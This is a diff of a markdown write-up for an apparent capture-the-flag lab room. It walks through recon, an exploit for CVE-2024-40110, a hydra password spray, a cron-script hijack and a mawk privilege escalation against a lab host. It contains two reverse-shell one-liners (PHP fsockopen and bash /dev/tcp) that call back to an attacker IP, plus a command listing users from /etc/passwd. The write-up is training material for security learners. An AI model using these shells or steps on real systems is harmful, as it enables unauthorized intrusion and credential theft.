@@ -10,17 +10,17 @@
 
 ![RCE](./img/02.png)
 
-## RECONAISSANCE AND ENUMERATION
+# RECONAISSANCE AND ENUMERATION
 
-# Nmap simple scan detect 3 opened ports:
+## Nmap simple scan detect 3 opened ports:
 
 ![RCE](./img/03.png)
 
-# Nmap services and versions scan:
+## Nmap services and versions scan:
 
 ![RCE](./img/04.png)
 
-# Nmap vulnerabilities scan:
+## Nmap vulnerabilities scan:
 
 ![RCE](./img/05.png)
 
@@ -28,97 +28,97 @@
 
 ![RCE](./img/07.png)
 
-# Web recon and enumeration by softwares and tecnology:
+## Web recon and enumeration by softwares and tecnology:
 
 ![RCE](./img/08.png)
 
 ![RCE](./img/09.png)
 
-# Access the URL indicate http://10.10.170.103/
+## Access the URL indicate http://10.10.170.103/
 
 ![RCE](./img/10.png)
 
-# Identified the support user e-mail as support@agropro.local
+## Identified the support user e-mail as support@agropro.local
 
 ![RCE](./img/11.png)
 
-# Bruteforce files and direcitories, identified the “/ranch” directory:
+## Bruteforce files and direcitories, identified the “/ranch” directory:
 
 ![RCE](./img/12.png)
 
-# New web enumeration on directory discovered indicate the Titlle “RedCock Farm”:
+## New web enumeration on directory discovered indicate the Titlle “RedCock Farm”:
 
 ![RCE](./img/13.png)
 
-# Access the new URL indicate http://10.10.170.103/ranch/
+## Access the new URL indicate http://10.10.170.103/ranch/
 
 ![RCE](./img/14.png)
 
-# New files and directories bruteforce
+## New files and directories bruteforce
 
 ![RCE](./img/15.png)
 
-## Theat modeling
+# Theat modeling
 
-# Search for exploits:
+## Search for exploits:
 
 ![RCE](./img/16.png)
 
 https://www.exploit-db.com/exploits/52053
 
-# Exploit download:
+## Exploit download:
 
 ![RCE](./img/17.png)
 
-# Necessary adjustment:
+## Necessary adjustment:
 
 ![RCE](./img/18.png)
 
 ![RCE](./img/19.png)
 
-# After adjustment:
+## After adjustment:
 
 ![RCE](./img/20.png)
 
 ![RCE](./img/21.png)
 
-# Executing the exploit - fail:
+## Executing the exploit - fail:
 
 ![RCE](./img/22.png)
 
-# Search for other exploit:
+## Search for other exploit:
 
 ![RCE](./img/23.png)
 
 https://github.com/thiagosmith/CVE-2024-40110
 
-# Raw code
+## Raw code
 
 https://raw.githubusercontent.com/thiagosmith/CVE-2024-40110/refs/heads/main/exploit.py
 
 ![RCE](./img/24.png)
 
-# Download new exploit:
+## Download new exploit:
 
 ![RCE](./img/25.png)
 
-# Necessary new adjustment:
+## Necessary new adjustment:
 
 ![RCE](./img/26.png)
 
 ![RCE](./img/27.png)
 
-# After new adjustment:
+## After new adjustment:
 
 ![RCE](./img/28.png)
 
 ![RCE](./img/29.png)
 
-# Executing the exploit - bingo!!!
+## Executing the exploit - bingo!!!
 
 ![RCE](./img/30.png)
 
-# Creating a payload of reverse Shell to the target:
+## Creating a payload of reverse Shell to the target:
 
 https://www.revshells.com/
 
@@ -130,29 +130,29 @@ PHP Choise because the application is PHP!!!
 php -r '$sock=fsockopen("10.17.51.216",9001);exec("sh <&3 >&3 2>&3");'
 ```
 
-# Listener:
+## Listener:
 
 ![RCE](./img/32.png)
 
-# Executing the revserse shell command on pseudo-shell by exploit:
+## Executing the revserse shell command on pseudo-shell by exploit:
 
 ![RCE](./img/33.png)
 
-# Receiver the reverse shell:
+## Receiver the reverse shell:
 
 ![RCE](./img/34.png)
 
-# Shell improvement:
+## Shell improvement:
 
 ![RCE](./img/35.png)
 
-# Internal enumeration:
+## Internal enumeration:
 
 ![RCE](./img/36.png)
 
 Discovered the “includes/dbconnection.php”
 
-# Read file:
+## Read file:
 
 ![RCE](./img/37.png)
 
@@ -162,18 +162,18 @@ user:
 pass: 
 ```
 
-# Reading the /etc/passwd file finding users in the host:
+## Reading the /etc/passwd file finding users in the host:
 
 ![RCE](./img/38.png)
 
 ```
 cat /etc/passwd | cut -d ":" -f 1
 ```
-# Users wordlist creation on my attack machine:
+## Users wordlist creation on my attack machine:
 
 ![RCE](./img/39.png)
 
-# Password spay with hydra on ssh service:
+## Password spay with hydra on ssh service:
 
 ![RCE](./img/40.png)
 
@@ -184,13 +184,13 @@ login:
 password: 
 ```
 
-# Initial acess from ssh user and pass. The first flag!!!
+## Initial acess from ssh user and pass. The first flag!!!
 
 ![RCE](./img/41.png)
 
-## Task 2 - Lateral movement and horizontal privilege escalation.
+# Task 2 - Lateral movement and horizontal privilege escalation.
 
-# Locate linpeas.sh
+## Locate linpeas.sh
 
 ![RCE](./img/42.png)
 
@@ -198,78 +198,116 @@ https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
 ![RCE](./img/43.png)
 
-# Download linpeas.sh
+## Download linpeas.sh
 
 ![RCE](./img/44.png)
 
-# Listener with web server in python:
+## Listener with web server in python:
 
 ![RCE](./img/45.png)
 
-# Request from target:
+## Request from target:
 
 ![RCE](./img/46.png)
 
-# Assigning execution rights to the binary file and execution:
+## Assigning execution rights to the binary file and execution:
 
 ![RCE](./img/47.png)
 
-## Important reports
+# Important reports
 
-# Kernel exploits less - probable:
+## Kernel exploits less - probable:
 
 ![RCE](./img/48.png)
 
-# Crontab:
+## Crontab:
 
-# Writable files:
+![RCE](./img/49.png)
 
-# Backup Folders:
+## Writable files:
 
-# Analyzing reported script:
+![RCE](./img/50.png)
 
-# Searching for a new reverse shell:
+## Backup Folders:
+
+![RCE](./img/51.png)
+
+## Analyzing reported script:
+
+![RCE](./img/52.png)
+
+![RCE](./img/52.png)
+
+![RCE](./img/54.png)
+
+![RCE](./img/55.png)
+
+## Searching for a new reverse shell:
+
+![RCE](./img/56.png)
+
+Bash to differentiate a little
 
 ```
 sh -i >& /dev/tcp/10.17.51.216/9001 0>&1
 ```
 
-# Inserting my reverse shell into the script:
+## Inserting my reverse shell into the script:
 
-# Opening the listner and wait the cron job:
+![RCE](./img/57.png)
 
-# Receive the reverse shell and taking the second user flag:
+## Opening the listner and wait the cron job:
 
-## Task 3- Vertical Privilege Escalation
+![RCE](./img/58.png)
 
-# Improving the shell:
+## Receive the reverse shell and taking the second user flag:
 
-# Checking permissions:
+![RCE](./img/59.png)
 
-# Searching about “mawk” on GTFOBINS:
+Houston, have a Shell!!
 
-# https://gtfobins.github.io/gtfobins/mawk
+# Task 3- Vertical Privilege Escalation
 
-# Escalating privilege vertically and getting the final root flag:
+## Improving the shell:
 
-## Final words:
-# The intention behind creating this room arose when, at a certain moment, I was researching exploits for vulnerable applications on the exploit-db.com website.
+![RCE](./img/60.png)
 
-# I found the exploit for the application I was testing in a fully controlled environment. However, when executing it, I received the error message described in this Write-Up.
+## Checking permissions:
 
-# Faced with adversity, I managed to fix the exploit and enhance it to meet my specific needs at that moment.
+![RCE](./img/61.png)
 
-# I built the machine and the room with the aim of helping enthusiasts understand that we need to adapt to applications and that not every exploit we find will work successfully on the first attempt.
+## Searching about “mawk” on GTFOBINS:
 
-# Persistence is the key word in this challenge, proposed for those who decide to accept it.
+https://gtfobins.github.io/gtfobins/mawk
 
+![RCE](./img/62.png)
+
+## Escalating privilege vertically and getting the final root flag:
+
+![RCE](./img/63.png)
+
+# Final words:
+## The intention behind creating this room arose when, at a certain moment, I was researching exploits for vulnerable applications on the exploit-db.com website.
+
+## I found the exploit for the application I was testing in a fully controlled environment. However, when executing it, I received the error message described in this Write-Up.
+
+## Faced with adversity, I managed to fix the exploit and enhance it to meet my specific needs at that moment.
+
+## I built the machine and the room with the aim of helping enthusiasts understand that we need to adapt to applications and that not every exploit we find will work successfully on the first attempt.
+
+## Persistence is the key word in this challenge, proposed for those who decide to accept it.
+```
 “The true achievement is not just in finding a functional exploit, but in refining challenges, adapting strategies, and never giving up in the face of adversity. Persistence turns obstacles into learning and evolution!”
+```
+# About the author:
 
-## About the author:
+## https://www.linkedin.com/in/smith-braz-938825209/
 
-# https://www.linkedin.com/in/smith-braz-938825209/
+![RCE](./img/64.png)
 
+## https://tryhackme.com/p/5m1th
 
+![RCE](./img/65.png)
 
 Send me feedback, please…
 
